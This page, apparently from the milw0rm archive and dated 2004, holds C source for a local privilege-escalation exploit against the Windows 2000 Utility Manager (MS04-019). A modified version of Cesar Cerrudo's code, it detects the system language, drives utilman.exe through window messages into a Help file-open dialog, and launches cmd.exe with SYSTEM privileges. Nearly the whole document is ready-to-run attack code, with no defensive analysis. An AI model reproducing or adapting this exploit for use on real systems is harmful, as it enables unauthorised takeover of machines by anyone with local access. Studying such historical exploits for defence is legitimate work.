<html><head><title>MS Windows 2000 Universal Language Utility Manager Exploit (MS04-019)
</title></head><pre>/******************************************************************************************
 ****C*****O*****R*****O******M******P*****U*******T*******E******R*****2***0***0***4*****
 **                                [Crpt] Utility Manager exploit v1.666 modified by kralor [Crpt]                                **
 ******************************************************************************************
 **                          It gets system language and sets windows names to work on any win2k :P                     **
 **                                                     Feel free to add other languages :)                                                **
 **                                                           You know where we are..                                                          **
 *****C*****O*****R*****O******M******P*****U*******T*******E******R*****2***0***0***4****
 ******************************************************************************************/
/* original disclaimer */
//by Cesar Cerrudo  sqlsec&gt;at&lt;yahoo.com
//Local elevation of priviliges exploit for Windows 2K Utility Manager (second one!!!!)
//Gives you a shell with system privileges
//If you have problems try changing Sleep() values.
/* end of original disclaimer */

#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

struct {
 int id;
 char *utilman;
 char *winhelp;
 char *open;
} lang[] = {
	{ 0x0c,&quot;Gestionnaire d'utilitaires&quot;,&quot;aide de Windows&quot;,&quot;Ouvrir&quot; }, /* French  */
	{ 0x09,&quot;Utility manager&quot;,&quot;Windows Help&quot;,&quot;Open&quot; }		  /* English */
};

void print_lang(int id)
{
	char *lang_list[] = {&quot;Neutral&quot;,&quot;Arabic&quot;,&quot;Bulgarian&quot;,&quot;Catalan&quot;,&quot;Chinese&quot;,&quot;Czech&quot;,
			     &quot;Danish&quot;,&quot;German&quot;,&quot;Greek&quot;,&quot;English&quot;,&quot;Spanish&quot;,&quot;Finnish&quot;,
			     &quot;French&quot;,&quot;Hebrew&quot;,&quot;Hungarian&quot;,&quot;Icelandic&quot;,&quot;italian&quot;,
			     &quot;Japanese&quot;,&quot;Korean&quot;,&quot;Dutch&quot;,&quot;Norwegian&quot;,&quot;Polish&quot;,
			     &quot;Portuguese&quot;,&quot;Romanian&quot;,&quot;Russian&quot;,&quot;Croatian&quot;,&quot;Serbian&quot;,
			     &quot;Slovak&quot;,&quot;Albanian&quot;,&quot;Swedish&quot;,&quot;Thai&quot;,&quot;Turkish&quot;,&quot;Urdu&quot;,
			     &quot;Indonesian&quot;,&quot;Ukrainian&quot;,&quot;Belarusian&quot;,&quot;Slovenian&quot;,
			     &quot;Estonian&quot;,&quot;Latvian&quot;,&quot;Lithuanian&quot;,&quot;Farsi&quot;,&quot;Vietnamese&quot;,
			     &quot;Armenian&quot;,&quot;Azeri&quot;,&quot;Basque&quot;,&quot;FYRO Macedonian&quot;,&quot;Afrikaans&quot;,
			     &quot;Georgian&quot;,&quot;Faeroese&quot;,&quot;Hindi&quot;,&quot;Malay&quot;,&quot;Kazak&quot;,&quot;Kyrgyz&quot;,
			     &quot;Swahili&quot;,&quot;Uzbek&quot;,&quot;Tatar&quot;,&quot;Not supported&quot;,&quot;Punjabi&quot;,
			     &quot;Gujarati&quot;,&quot;Not supported&quot;,&quot;Tamil&quot;,&quot;Telugu&quot;,&quot;Kannada&quot;,
			     &quot;Not supported&quot;,&quot;Not supported&quot;,&quot;Marathi&quot;,&quot;Sanskrit&quot;,
			     &quot;Mongolian&quot;,&quot;Galician the best ;)&quot;,&quot;Konkani&quot;,&quot;Not supported&quot;,
			     &quot;Not supported&quot;,&quot;Syriac&quot;,&quot;Not supported&quot;,&quot;Not supported&quot;,
			     &quot;Divehi&quot;,&quot;Invariant&quot;};
	printf(&quot;%s\r\n&quot;,lang_list[id]);
	return;
}

int set_lang(void)
{
	unsigned int lang_usr,lang_sys,id;

	id=GetSystemDefaultLangID();
	lang_sys=PRIMARYLANGID(id);
	id=GetUserDefaultLangID();
	lang_usr=PRIMARYLANGID(id);
	if(lang_usr!=lang_sys) {
		printf(&quot;warning: user language differs from system language\r\n\r\n&quot;);
		printf(&quot;1. system : &quot;);print_lang(lang_sys);
		printf(&quot;2. user   : &quot;);print_lang(lang_usr);printf(&quot;Select(1-2): &quot;);
		id=getch();
	if(id!=49&amp;&amp;id!=50) {
		printf(&quot;wrong choice '%c', leaving.\r\n&quot;,id);
		exit(0);
		}
	if(id==49) {
		printf(&quot;system language\r\n&quot;);
		return lang_sys;
		}
	else
		printf(&quot;user language\r\n&quot;);
	}
	return lang_usr;
}

void banner()
{
	system(&quot;cls&quot;);
	printf(&quot;\r\n\r\n\t[Crpt] Utility Manager exploit v1.666 modified by kralor [Crpt]\r\n&quot;);
	printf(&quot;\t\t\t  base code by Cesar Cerrudo\r\n&quot;);
	printf(&quot;\t\t\t   You know where we are...\r\n\r\n&quot;);
	return;
}

int main(int argc, char* argv[])
{
        HWND lHandle, lHandle2;
        POINT point;
        char cmd[]=&quot;%windir%\\system32\\cmd.ex?&quot;;
	unsigned int i;
	int lang_id;

	banner();

	printf(&quot;[+] Gathering system language information\r\n&quot;);
	lang_id=set_lang();
	printf(&quot;[+] OK language ...&quot;);print_lang(lang_id);

	for(i=0;i&lt;sizeof(lang)/sizeof(lang[0]);i++)
		if(lang[i].id==lang_id)
			break;
	if(i==sizeof(lang)/sizeof(lang[0])) {
		printf(&quot;error: undefined language.\r\n&quot;);
		return -1;
	}
	printf(&quot;[+] Trying to execute program with SYSTEM priviliges through utilman.exe\r\n&quot;);
	printf(&quot;prog: %s\r\n&quot;,cmd);
//  run utility manager
//       system(&quot;utilman.exe /start&quot;);
	WinExec(&quot;utilman.exe /start&quot;,SW_HIDE);
       Sleep(1000);

	lHandle=FindWindow(NULL, lang[i].utilman);   
        if (!lHandle) {
		printf(&quot;error: unable to start utilman.exe.\r\n&quot;);
                return 0;
        }

        PostMessage(lHandle,0x313,0,0); //=right click on the app button in the
	//taskbar or Alt+Space Bar
        
        Sleep(100);

        SendMessage(lHandle,0x365,0,0x1); //send WM_COMMANDHELP  0x0365  lParam must be&lt;&gt;NULL 
        Sleep(300);
        
	SendMessage (FindWindow(NULL, lang[i].winhelp), WM_IME_KEYDOWN, VK_RETURN, 0);
        Sleep(500);

        // find open file dialog window
	lHandle = FindWindow(&quot;#32770&quot;,lang[i].open);
        // get input box handle
        lHandle2 = GetDlgItem(lHandle, 0x47C);
        Sleep(500);

        // set text to filter listview to display only cmd.exe
        SendMessage (lHandle2, WM_SETTEXT, 0, (LPARAM)cmd);
        Sleep(800);

        // send return
        SendMessage (lHandle2, WM_IME_KEYDOWN, VK_RETURN, 0);

        //get navigation bar handle
        lHandle2 = GetDlgItem(lHandle, 0x4A0);
        
        //send tab
        SendMessage (lHandle2, WM_IME_KEYDOWN, VK_TAB, 0);
        Sleep(500);
        lHandle2 = FindWindowEx(lHandle,NULL,&quot;SHELLDLL_DefView&quot;, NULL);
        //get list view handle
        lHandle2 = GetDlgItem(lHandle2, 0x1);

        SendMessage (lHandle2, WM_IME_KEYDOWN, 0x43, 0); // send &quot;c&quot; char
        SendMessage (lHandle2, WM_IME_KEYDOWN, 0x4D, 0); // send &quot;m&quot; char
        SendMessage (lHandle2, WM_IME_KEYDOWN, 0x44, 0); // send &quot;d&quot; char
        Sleep(500);

        //popup context menu
        PostMessage (lHandle2, WM_CONTEXTMENU, 0, 0);
        Sleep(1000);

        // get context menu handle
        point.x =10; point.y =30;
        lHandle2=WindowFromPoint(point);

        SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0); // move down in menu
        SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0); // move down in menu
        SendMessage (lHandle2, WM_KEYDOWN, VK_RETURN, 0); // send return

        SendMessage (lHandle, WM_CLOSE,0,0); // close open file dialog window
        Sleep(500);

	SendMessage (FindWindow(NULL, lang[i].winhelp), WM_CLOSE, 0, 0);// close open error window
	SendMessage (FindWindow(NULL, lang[i].utilman), WM_CLOSE, 0, 0);// close utilitymanager
        return 0;
}


// milw0rm.com [2004-07-17]</pre></html>